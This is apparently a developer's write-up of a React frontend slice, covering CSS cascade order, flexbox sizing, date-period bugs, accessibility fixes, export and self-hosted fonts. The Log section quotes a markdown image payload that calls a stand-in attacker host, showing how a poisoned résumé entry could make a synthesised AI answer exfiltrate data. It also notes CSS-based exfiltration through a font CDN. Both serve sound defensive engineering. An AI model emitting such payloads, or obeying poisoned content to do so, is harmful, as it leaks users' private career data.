Background

CareerVault's frontend is a React + Vite single-page app (ADR-003) served from S3 behind CloudFront (ADR-019), talking to API Gateway with a Cognito JWT (ADR-025). Slice 1 rebuilt the shell — header, navigation, and a new Home — on a fresh design-token layer. This slice rebuilt four of the five views behind that shell. It is a pure frontend diff: no Lambda, no DynamoDB, no SAM template, nothing deployed.

That makes it an unusually good slice to learn from, because nothing here is hidden behind a cloud service. Every bug in it is a bug you can reason about from first principles — and there were fifteen.

Skippable if you know CSS: what a design token actually is

A CSS custom property is a variable you declare on a selector and read with var():

:root {
  --surface: #12121c;   /* declare, usually on the root element */
}

.card {
  background: var(--surface);   /* read */
}

The reason CareerVault funnels every colour through these is ADR-044: the app ships light and dark themes, and a theme swap is then just re-declaring the same names under a media query. A raw #12121c written directly into a component's stylesheet silently opts that one rule out of theming — and because the team reviews in dark mode, it is a light-mode bug that dark-mode review cannot see. Hence the standing rule: index.css is the only file in the app allowed to define a colour.

The sharp edge: an unset custom property does not fall back to anything. var(--nope) resolves to nothing at all, and the declaration is dropped. This is why slice 1 could not simply rename the old token set — five feature stylesheets still referenced the old names, and renaming would have rendered those views colourless rather than throwing an error. Slice 1 left behind a deliberate compatibility shim: five one-line aliases mapping old names to new ones, to be deleted view by view.

Skippable if you know it: the accessibility tree

Every browser builds a second tree alongside the DOM — the accessibility tree — which is what a screen reader actually reads. Elements land in it with a role (button, heading, log), an accessible name, and state. Most of the time the mapping is automatic and invisible, which is precisely the problem: an interface can be completely broken in that tree while looking perfect on screen, and no test, typecheck, or lint run will say a word.

Slice 1 ran an audit that enumerated eighteen such findings. Nine were fixed there; the rest were filed against the views that would fix them. This slice inherited A4 (the chat transcript announced nothing), A5 (message authorship was conveyed by which side of the screen the bubble sat on — invisible to a screen reader), A6 (the typing indicator announced as a literal "…"), A7 (a bare "Retry" button unattached to any message) and A9 (the file upload input had no accessible name at all).

Intuition

Four ideas in this slice are worth carrying away. Each one is a case where a reasonable mental model quietly disagreed with how the machine actually behaves.

1. Vite bundles CSS child-first, which inverts the cascade you expect

When two CSS rules have equal specificity, the one that appears later in the stylesheet wins. So this looks obviously fine:

// App.css — the shared layer
.card { flex-direction: column; }

// settings.css — a specific view
.data-card { flex-direction: row; }   /* surely this wins? */

Both selectors are one class, so specificity is a tie, and the view-specific rule is "more specific" in the human sense. But which one is later depends entirely on the order the bundler emits them — and Vite emits CSS in module-graph order. App.tsx imported its child components above its own stylesheet, so every child's CSS landed in the bundle first:

index.css
tokens
→
settings.css
.data-card { row }
→
App.css
.card { column } ← wins

The card rendered as a centred column instead of a row. Nothing errored. The fix was one line — move import './App.css' above the component imports — which restores the order everyone already assumes: tokens → shared → feature.

The generalisable bit: "more specific" is not a thing CSS knows about your architecture. If your layering depends on source order, something has to guarantee that order. Here it is a single import placed deliberately, with a comment explaining why moving it would break things.

2. flex: 1 is not "take the space" — it silently overrides your height

The chat panel is a column: header, scrolling transcript, composer. The transcript was written as:

.messages {
  flex: 1;        /* "grow to fill" */
  height: 400px;  /* the design's specified height */
}

The panel collapsed to the size of a single message bubble. flex: 1 is shorthand for flex-grow: 1; flex-shrink: 1; flex-basis: 0% — and flex-basis takes precedence over height on the main axis. The declared 400px was never consulted. Writing flex: 1 1 auto instead makes flex-basis defer to height, so the height becomes a preferred size that can still shrink.

One more piece was needed. A flex item's automatic minimum size is its content, so a long transcript would push the panel open rather than scrolling inside it. min-height: 0 is what actually permits the shrink — a two-character declaration that is the difference between "scrolls" and "overflows".

3. The Unix epoch is a Thursday

This is the slice's best bug. CareerVault tracks a streak: consecutive cadence periods in which you logged at least one entry. Periods are calendar-anchored (ADR-045), so a week runs Monday to Monday. Two functions need to agree: periodIndex(date) gives a period a number, and periodStart(date) gives the timestamp it began at.

For a fortnight, periodStart was written as "take the week index, round down to an even number, multiply back into a timestamp":

Math.floor(weekIndex / 2) * 2 * WEEK_MS

Reasonable — and wrong, because a week index cannot be converted back into a timestamp by multiplying. Timestamps count from 1 January 1970, and that day was a Thursday. Every exact multiple of one week from the epoch is therefore also a Thursday:

1 Jan 1970
Thursday
+7d
8 Jan 1970
Thursday
…
30 Jul 2026
Thursday

So periodStart returned a Thursday — four days before the Monday the period actually began, which put it in the previous fortnight entirely. Verified numerically: for 8 August 2026, periodIndex(date) was 1476 while periodIndex(periodStart(date)) was 1475. The two functions disagreed by a whole period, so the sidebar's "logged this period" list and the streak counted different fortnights, and the heading read "Logged since Thursday" for a week starting Monday.

The fix steps back from a known Monday instead of multiplying into one. The test is the more interesting artifact: rather than asserting specific dates, it asserts the invariant that was broken — periodIndex(periodStart(d)) === periodIndex(d), across four cadences and forty dates.

4. Elapsed time is not calendar days

The Log opens by naming your most recent entry and how long ago it was. The handoff hardcoded "It's been a week…", which is false for anyone who logged something yesterday, so the slice measured it instead. The first implementation:

Math.floor((now - then) / 24_HOURS)

Log something at 23:00; open the app at 09:00 the next morning. Ten hours have elapsed, which floors to zero days, so the app says "You logged X today" about something you logged yesterday — the exact class of misstatement the function was written to prevent. The same arithmetic makes every boundary drift by the time of day: 6d23h reads as "6 days", 7d1h as "a week".

Rule of thumb: if a human would answer the question by looking at a calendar, compute it on a calendar. Truncate both instants to their date first, then subtract. Dividing by 86,400,000 answers a different question than the one users are asking.

Cross-cloud parallel

Nothing in this slice is AWS-specific, which is itself worth noticing: the static-hosting shape (ADR-019) is CloudFront + S3 on AWS, Front Door + Blob Storage static websites on Azure, and Cloud CDN + Cloud Storage on GCP. The interesting consequence is where a security control has to live. Self-hosting the web fonts (below) removed the app's only external subresource, but a Content-Security-Policy header is configured on the CDN, not in the app — an AWS ResponseHeadersPolicy, an Azure Front Door rule set, a GCP URL-map response-header action. Same control, three different places, none of them the code. That is logged as B-038.

Code walkthrough

The shared layer, extracted first

Slice 1 put .card, .eyebrow, .chip and friends in home.css, because Home was the only redesigned view. Four more views now needed the same vocabulary. The options were to import Home's stylesheet from Timeline (a dependency asserting a relationship that does not exist) or to copy the values (which is how two cards drift apart). Neither is good, so the primitives moved to frontend/src/App.css — a layer that always loads and already owns the shell.

One rule came out of that move and is written into the file: padding lives on .view alone. A view stylesheet layers max-width and its own internals, never the page padding — otherwise six views drift apart by a few pixels each.

The Log: a live region, and who said what

Chat.tsx carries four of the five inherited accessibility findings. The transcript became a role="log" container with aria-live="polite", which is the ARIA role for exactly this — a region where new content is appended in meaningful order — so an assistant reply is announced instead of appearing silently (A4).

Authorship (A5) was previously conveyed only by alignment: user bubbles right, assistant bubbles left. That is invisible in the accessibility tree. Each message now carries a visually-hidden prefix:

<div className="msg user">
  <span className="sr-only">You said:</span>
  <p className="bubble-user">{turn.text}</p>

And the retry button (A7) names the message it will resend — aria-label={`Retry sending: ${excerpt(turn.text)}`} — so it is not one of several identical "Retry" buttons with no context.

Load-bearing, not stylistic: {turn.text} renders as a text node. Entry content can originate in an uploaded résumé, so an answer synthesised from it is not fully trusted; a markdown renderer here would let a poisoned entry emit ![](https://attacker/?d=…) and exfiltrate on image load. This is B-012 / ADR-038, and it now has a regression test that feeds real markup through the answer path and asserts no <img> element exists.

The Timeline: an overlay that expires during render

The shell owns the entry list, so Timeline.tsx reports edits upward and waits for a refetch — measured at ~3.6s cold. Waiting meant a rename was invisible for that whole window, and a delete was worse: the row survived, so the selection fell back onto the record that had just been deleted and the panel offered Edit and Delete on something that no longer existed.

The fix is a local overlay of edits and deletes, layered over the shell's list. The subtlety is when it expires. The obvious approach — an effect watching entries — costs a second render pass on every refetch and leaves one paint showing stale data on top of fresh. Instead the overlay records the array it was built against, and is discarded during render when that identity changes:

const active = overlay.source === entries ? overlay : emptyOverlay(entries);

The same reasoning removed a second effect. Deleting the last record of a type removes its filter chip but left the filter selected, showing a populated vault with an empty list and no active chip. Rather than correcting the state from an effect, the effective filter is derived:

const activeFilter = filters.some(f => f.id === filter) ? filter : "ALL";

No render can observe the invalid value, and filter stays a record of what the user actually chose — so re-adding a certification restores their filter rather than having silently reset it.

Details: rebuilding a native control means rebuilding its keyboard

The cadence picker in Settings.tsx replaced a <select> with styled buttons carrying role="radio". Roles describe; they do not implement. A native select gives arrow keys, Home/End, and a single tab stop for free; the replacement shipped four tab stops and dead arrow keys — a net accessibility regression in the slice meant to close accessibility findings. useRovingRadio restores the WAI-ARIA radiogroup contract: one tab stop via roving tabIndex, arrows and Home/End moving both selection and focus.

A related judgement: when check-ins are paused the options use aria-disabled rather than disabled. A disabled button leaves the tab order entirely, so a keyboard user would find the control had vanished with no explanation. aria-disabled keeps it reachable and readable, and inert.

Details: the export, and a download that can vanish

The JSON export is the slice's one genuinely new feature, and it follows ADR-045's pattern — derive in the browser rather than add an endpoint. GET /entries is already fetched, so the export is a Blob over data in hand. The backend strips embedding vectors before returning entries (career_crud/handler.py:61), so the file is clean records rather than megabytes of floats.

The first version revoked the blob URL immediately after click(), on an anchor never added to the document. That works in Chrome and is not specified: Firefox and WebKit queue the download of a detached anchor, so tearing the URL down in the same task can leave it fetching a dead URL — the user clicks Export and silently gets nothing. The fix appends the anchor, clicks, removes it, and defers the revoke by one task.

Import: a label that is also a dropzone

Finding A9 — the file input had no accessible name at all — is fixed by the design's own dropzone. Wrapping a visually-hidden input in a <label> gives it a name, makes the whole panel a click target, and keeps native file-input semantics. "Visually hidden" matters: display: none would remove it from the tab order and the accessibility tree, trading one barrier for another. It is hidden by clipping, and the focus ring is driven from :focus-within on the label since the input itself cannot show one.

Retiring the scaffolding — and a prediction that was wrong

The slice plan said "four of five shim aliases deleted". Only one could go. The aliases were never one-per-view: resume.css alone still references four of them, so they die together when the Résumés view is rebuilt. The plan asserted a fact about the codebase that thirty seconds of grep would have contradicted.

What the slice did instead is arguably more useful than being right: the remaining aliases are now named, with the command that verifies them written into the comment, and the completion condition is filed as B-036 rather than left in someone's memory.

Fonts, self-hosted

B-032 replaced a Google Fonts @import with four vendored woff2 files (73 KB). Both families are variable fonts, so one file per character subset covers every weight — hence font-weight: 400 700 ranges rather than one @font-face per weight. The motivation was security: @import admits no subresource integrity and the app sets no CSP, so a compromised font CDN could serve arbitrary CSS. That cannot execute script, but attribute-selector background URLs can exfiltrate — and this app holds a career history.
